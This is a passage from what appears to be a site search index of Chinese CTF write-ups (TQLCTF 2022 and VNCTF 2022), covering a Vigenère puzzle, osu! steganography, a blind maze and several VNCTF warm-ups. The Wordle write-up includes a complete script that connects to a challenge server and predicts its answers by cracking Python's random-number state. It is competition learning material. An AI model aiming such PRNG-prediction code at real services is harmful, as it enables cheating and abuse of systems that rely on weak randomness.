res . split ()[ 2 ])) times = 0 # log.info(f\" {direction} move to: ({X}, {Y})\") log . info ( f \" { direction } to bound: ( { X } , { Y } )\" ) else : now = int ( X ) if direction in \"ws\" else int ( Y ) while abs (( int ( X ) if direction in \"ws\" else int ( Y )) - now ) != aim : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) pygame . display . update () pygame . draw . circle ( screen , RED , [ 20 + Y * 10 , 20 + X * 10 ], 10 , 2 ) pygame . display . update () if \"Cannot be moved\" not in res : update_value ( direction , float ( res . split ()[ 2 ])) else : log . info ( f \"Can't move to { aim } in { direction } \" ) break log . info ( f \" { direction } move to: ( { X } , { Y } )\" ) return True move ( \"w\" ) move ( \"d\" ) X , Y = 0 , 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e def w ( cnt = 1 ): # \u4fbf\u4e8e\u4ea4\u4e92 for _ in range ( cnt ): move ( \"w\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def a ( cnt = 1 ): for _ in range ( cnt ): move ( \"a\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def s ( cnt = 1 ): for _ in range ( cnt ): move ( \"s\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def d ( cnt = 1 ): for _ in range ( cnt ): move ( \"d\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () while True : pygame . display . update () pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () op = input ( \"> \" ) exec ( op ) \u7ed3\u679c\uff1a nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c \u8fd9\u4e2a\u89c6\u9891 \u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a","title":"TQLCTF 2022"},{"location":"writeups/tqlctf2022/#tqlctf-2022-writeup","text":"Abstract \u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88 nano \u7684\u5b98\u65b9 writeup","title":"TQLCTF 2022 Writeup"},{"location":"writeups/tqlctf2022/#ranma12","text":"\u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09 \u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd. Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q} \u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract: ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems. The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo. UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values. \u53cd\u63a8\u51fa key\uff1a CODINGWORLD \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a TQLCTF{CODIN6_WOR1D}","title":"Ranma\u00bd"},{"location":"writeups/tqlctf2022/#wordle","text":"wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9 \u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684 zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5 \u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca # To prevent the disclosure of answer \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898 \u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a id = random . randrange ( len ( valid_words ) * ( 2 ** 20 )) answer = valid_words [ id % len ( valid_words )] id = ( id // len ( valid_words )) ^ ( id % len ( valid_words )) return hex ( id )[ 2 :] . zfill ( 5 ), answer \u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 id % len(valid_words) \uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 id // len(valid_words) \uff0c\u800c len(valid_words) \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 id \uff0c\u5373 randrange \u7684\u7ed3\u679c \u7206\u7834 random \u4f7f\u7528 tna0y/Python-random-module-cracker \uff0c\u9700\u8981 512 \u4e2a random \u7684\u7ed3\u679c \u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848 \u5b8c\u6574\u4ee3\u7801 import re import sys from pwn import * from tqdm import tqdm from enum import Enum from collections import Counter from randcrack import RandCrack MAX_ATTEMPT = 6 class LetterVerdict ( Enum ): GREEN = 1 YELLOW = 2 GRAY = 3 class AttemptVerdict ( Enum ): WON = 1 LOST = 2 FAILED_ATTEMPT = 3 INVALID_TRY = 4 INVALID_WORD = 5 def get_all_wordle_words (): with open ( \"valid_words.txt\" , \"r\" ) as infile : return [ line . strip () for line in infile . readlines ()] class WordleSolver : def __init__ ( self ): self . __all_possible_words = set ( get_all_wordle_words ()) self . __invalid_letters = set () self . __untried_letters = set () self . __candidate_words = [] self . __green_blocks = set () self . __yellow_blocks = set () self . attempt = 0 self . game_number = - 1 self . tries = [] self . reset () def reset ( self ): self . __invalid_letters . clear () self . __candidate_words = sorted ( list ( self . __all_possible_words )) self . __yellow_blocks . clear () self . __green_blocks . clear () self . attempt = 0 self . __untried_letters = set ( chr ( ord ( 'a' ) + i ) for i in range ( 26 )) self . game_number += 1 self . tries . clear () def __contains_forbidden_letters ( self , word ): for ind , c in enumerate ( word ): if ( c , ind ) not in self . __green_blocks : # here fix a bug in if c in self . __invalid_letters : # the original solver return True return False def __get_untried_letter_probability ( self , words ): counter = Counter () for w in words : for c in w : if c in self . __untried_letters : counter [ c ] += 1 return counter def __get_letter_freq_map ( self , words ): counter = Counter () for w in words : for c in w : counter [ c ] += 1 return counter def __matches_green_constraints ( self , word ): for letter , index in self . __green_blocks : if word [ index ] != letter : return False return True def __matches_yellow_constraints ( self , word ): for letter , index in self . __yellow_blocks : if word [ index ] == letter or letter not in word : return False return True def __filter_out_invalid_words ( self ): new_candidates = [] for word in self . __candidate_words : if self . __contains_forbidden_letters ( word ) or not self . __matches_green_constraints ( word ) or not self . __matches_yellow_constraints ( word ): continue new_candidates . append ( word ) self . __candidate_words = new_candidates def __make_educated_guess ( self ): untried_letters = self . __get_untried_letter_probability ( self . __candidate_words ) freq_map = self . __get_letter_freq_map ( self . __candidate_words ) if len ( untried_letters ) > 1 and self . attempt <= MAX_ATTEMPT - 1 : word_with_score = [] word_list = self . __all_possible_words for word in word_list : letters = set ( word ) untried_score = sum ( untried_letters [ c ] if c in untried_letters else 0 for c in letters ) freq_score = sum ( freq_map [ c ] for c in letters ) word_with_score . append (( word , untried_score , freq_score )) ranked_words = sorted ( word_with_score , key = lambda item : ( - item [ 1 ], - item [ 2 ], item [ 0 ])) guess = ranked_words [ 0 ][ 0 ] else : guess = sorted ( self . __candidate_words , key = lambda word : ( - len ( set ( word )), - sum ( freq_map [ c ] for c in word ), word ) )[ 0 ] return guess def __pick_a_word ( self ): self . __filter_out_invalid_words () if len ( self . __candidate_words ) == 0 : # for debug res = input ( \">>> \" ) return res . strip () elif len ( self . __candidate_words ) == 1 : return self . __candidate_words [ 0 ] return self . __make_educated_guess () def solve ( self , wordle ): last_guess = \"\" wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () while True : self . attempt += 1 guess = self . __pick_a_word () if last_guess == guess : # here fix a bug in the original solver self . __candidate_words . remove ( guess ) guess = self . __pick_a_word () result , letter_verdicts = wordle . guess ( guess ) last_guess = guess self . tries . append ( guess ) if result == AttemptVerdict . WON : return hex_id , guess elif result == AttemptVerdict . LOST : return False elif result == AttemptVerdict . FAILED_ATTEMPT : for chr in guess : self . __untried_letters . discard ( chr ) for i in range ( len ( letter_verdicts )): letter , verdict = letter_verdicts [ i ] if verdict == LetterVerdict . GRAY : flag = True for ( l , _ ) in self . __yellow_blocks : # here fix a bug in if l == letter : # the original solver flag = False break if flag : self . __invalid_letters . add ( letter ) elif verdict == LetterVerdict . GREEN : self . __green_blocks . add (( letter , i )) if ( letter , i ) in self . __yellow_blocks : self . __yellow_blocks . remove (( letter , i )) elif verdict == LetterVerdict . YELLOW : self . __yellow_blocks . add (( letter , i )) else : exit ( 1 ) elif result == AttemptVerdict . INVALID_WORD : self . attempt -= 1 self . __candidate_words . remove ( guess ) self . __all_possible_words . remove ( guess ) class Wordle : def __init__ ( self , mode ): self . p = connect ( \"47.106.102.129\" , 23370 ) self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def restart ( self , mode ): self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def guess ( self , word ): self . p . sendlineafter ( b \"> \" , word . encode ( \"utf-8\" )) status = self . p . recvuntil ( b \"!\" ) if status == b \"Correct!\" : return AttemptVerdict . WON , None result = self . p . recvline () . decode ( \"utf-8\" ) res = re . findall ( r \"\\[4(\\d)m\" , result ) ret = [] for i in range ( 5 ): c = word [ i ] if res [ i ] == \"7\" : ret . append (( c , LetterVerdict . GRAY )) elif res [ i ] == \"3\" : ret . append (( c , LetterVerdict . YELLOW )) else : ret . append (( c , LetterVerdict . GREEN )) attempt_verdict = AttemptVerdict . WON for _ , verdict in ret : if verdict != LetterVerdict . GREEN : attempt_verdict = AttemptVerdict . FAILED_ATTEMPT break return attempt_verdict , ret cracker = RandCrack () wordle = Wordle ( 0 ) solver = WordleSolver () def calc_random_id ( hex_id , word ): valid_words = get_all_wordle_words () length = len ( valid_words ) index = valid_words . index ( word ) # id % len(valid_words) Id = eval ( \"0x\" + hex_id ) tmp = Id ^ index # id // len(valid_words) return tmp * length + index def calc_hex_id_and_word ( random_value ): valid_words = get_all_wordle_words () length = len ( valid_words ) word = valid_words [ random_value % length ] hex_value = ( random_value // length ) ^ ( random_value % length ) return hex ( hex_value )[ 2 :] . zfill ( 5 ), word with tqdm ( total = 624 , desc = \"Cracking random...\" ) as pbar : for i in range ( 512 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) wordle . restart ( 0 ) for i in range ( 112 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) with tqdm ( total = 400 , desc = \"Verifying crack result...\" ) as pbar : for i in range ( 400 ): solver . reset () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) hex_id , answer = solver . solve ( wordle ) if p_hex_id != hex_id : print ( f \"Crack faild: \\n predict: { p_hex_id } , { p_answer } \\n challenge: { hex_id } , { answer } \" ) sys . exit ( 1 ) pbar . update ( 1 ) wordle . p . sendlineafter ( b \"> \" , b \"3\" ) # insane level with tqdm ( total = 512 , desc = \"Solving insane level...\" ) as pbar : for i in range ( 512 ): wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) if hex_id != p_hex_id : print ( f \"Predict failed: \\n predic: { p_hex_id } \\n challenge: { hex_id } \" ) sys . exit ( 1 ) wordle . p . sendlineafter ( b \"> \" , p_answer . encode ( \"utf-8\" )) pbar . update ( 1 ) wordle . p . interactive ()","title":"wordle"},{"location":"writeups/tqlctf2022/#the-ohio-state-university","text":"\u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1a https://osu.ppy.sh/beatmapsets/1235288#mania/2568956 \u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c \u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a pwd: VVelcome!! \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a TQLCTF{VVElcOM3 BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a WAVPassword: MisoilePunch \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206 _TO_O$u_i7s_ \u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86 \u5269\u4e0b\u4e00\u90e8\u5206\u662f flag \u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme} \u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme}","title":"the Ohio State University"},{"location":"writeups/tqlctf2022/#nanomaze","text":"\u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab \u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e \u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f \u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21 \u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a \u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e \u4ee3\u7801 from pwn import * import pygame from pygame.locals import * p = process ([ \"python\" , \"main.py\" ]) # \u672c\u5730\u590d\u73b0 X , Y = 0 , 0 width = 75 pygame . init () WHITE = ( 255 , 255 , 255 ) GREEN = ( 0 , 255 , 0 ) RED = ( 255 , 0 , 0 ) BLUE = ( 0 , 0 , 255 ) size = width , height = 800 , 1000 clock = pygame . time . Clock () screen = pygame . display . set_mode ( size ) pygame . display . set_caption ( \"nanomaze\" ) screen . fill ( WHITE ) pygame . display . flip () def send ( direction ): res = p . recvuntil ( b \"> \" ) click = False if \"[click]\" in res . decode ( \"utf-8\" ): click = True p . sendline ( direction . encode ( \"utf-8\" )) return click , p . recvline () . decode ( \"utf-8\" ) . strip () def update_value ( direction , value ): global X , Y if direction == \"w\" : X -= value elif direction == \"a\" : Y -= value elif direction == \"s\" : X += value else : Y += value if Y < 0 : Y += 75 def move ( direction , aim = None ): if aim is None : times = 0 while times < 20 : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) return if \"Cannot be moved\" in res : times += 1 else : update_value ( direction , float ( res . split ()[ 2 ])) times = 0 # log.info(f\" {direction} move to: ({X}, {Y})\") log . info ( f \" { direction } to bound: ( { X } , { Y } )\" ) else : now = int ( X ) if direction in \"ws\" else int ( Y ) while abs (( int ( X ) if direction in \"ws\" else int ( Y )) - now ) != aim : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) pygame . display . update () pygame . draw . circle ( screen , RED , [ 20 + Y * 10 , 20 + X * 10 ], 10 , 2 ) pygame . display . update () if \"Cannot be moved\" not in res : update_value ( direction , float ( res . split ()[ 2 ])) else : log . info ( f \"Can't move to { aim } in { direction } \" ) break log . info ( f \" { direction } move to: ( { X } , { Y } )\" ) return True move ( \"w\" ) move ( \"d\" ) X , Y = 0 , 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e def w ( cnt = 1 ): # \u4fbf\u4e8e\u4ea4\u4e92 for _ in range ( cnt ): move ( \"w\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def a ( cnt = 1 ): for _ in range ( cnt ): move ( \"a\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def s ( cnt = 1 ): for _ in range ( cnt ): move ( \"s\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def d ( cnt = 1 ): for _ in range ( cnt ): move ( \"d\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () while True : pygame . display . update () pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () op = input ( \"> \" ) exec ( op ) \u7ed3\u679c\uff1a nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c \u8fd9\u4e2a\u89c6\u9891 \u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a","title":"Nanomaze"},{"location":"writeups/vnctf2022/","text":"VNCTF 2022 Writeup \u00b6 Abstract \u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35 \u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86 VNCTF 2022 Official WriteUp GameV4.0 \u00b6 web \u7c7b\u578b\u7684\u7b7e\u5230\u9898 \u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c \"ZmxhZw==\" : \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\" base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: VNCTF{Welcome_to_VNCTF2022} gocalc0 \u00b6 \u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86 \u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os= base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a flag{062b86e3-2b52-4015-8626-7a9ce94515f4} ezmath \u00b6 \u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto \u9898\u76ee\u95ee\u7b2c x \u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86 BabyMaze \u00b6 \u4e00\u9053 python \u7684 rev \u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 import dis import marshal with open ( \"BabyMaze.pyc\" , \"rb\" ) as f : code = marshal . loads ( f . read ()[ 16 :]) dis . dis ( code ) \u5f97\u5230\u5f00\u5934\uff1a 1 0 JUMP_ABSOLUTE 4 >> 2 JUMP_ABSOLUTE 6 >> 4 JUMP_ABSOLUTE 2 >> 6 LOAD_CONST 0 ( 1 ) ... 66 LOAD_CONST 0 ( 1 ) 68 BUILD_LIST 31 70 LOAD_CONST 0 ( 1 ) 72 LOAD_CONST 1 ( 5 ) 74 LOAD_CONST 0 ( 1 ) ... 130 LOAD_CONST 0 ( 1 ) 132 BUILD_LIST 31 ... ... 1862 LOAD_CONST 0 ( 1 ) 1864 LOAD_CONST 2 ( 0 ) ... 1920 LOAD_CONST 3 ( 7 ) 1922 LOAD_CONST 0 ( 1 ) 1924 BUILD_LIST 31 1926 LOAD_CONST 0 ( 1 ) ... 1986 LOAD_CONST 0 ( 1 ) 3 1988 BUILD_LIST 31 1990 BUILD_LIST 31 1992 STORE_NAME 0 ( _map ) \u7ed3\u5c3e\uff1a Disassembly of < code object main at 0x00000222A2AC4660 , file \".\\BabyMaze.py\" , line 23 > : 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 1 ( 'Welcome To VNCTF2022!!!' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 LOAD_GLOBAL 0 ( print ) 0 LOAD_CONST 2 ( 'Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)' ) 2 CALL_FUNCTION 1 4 POP_TOP 6 LOAD_GLOBAL 0 ( print ) 8 LOAD_CONST 3 ( 'you are still doing the mission alone, this tape will self-destruct in five seconds.' ) 0 CALL_FUNCTION 1 2 POP_TOP 4 LOAD_GLOBAL 1 ( maze ) 6 CALL_FUNCTION 0 8 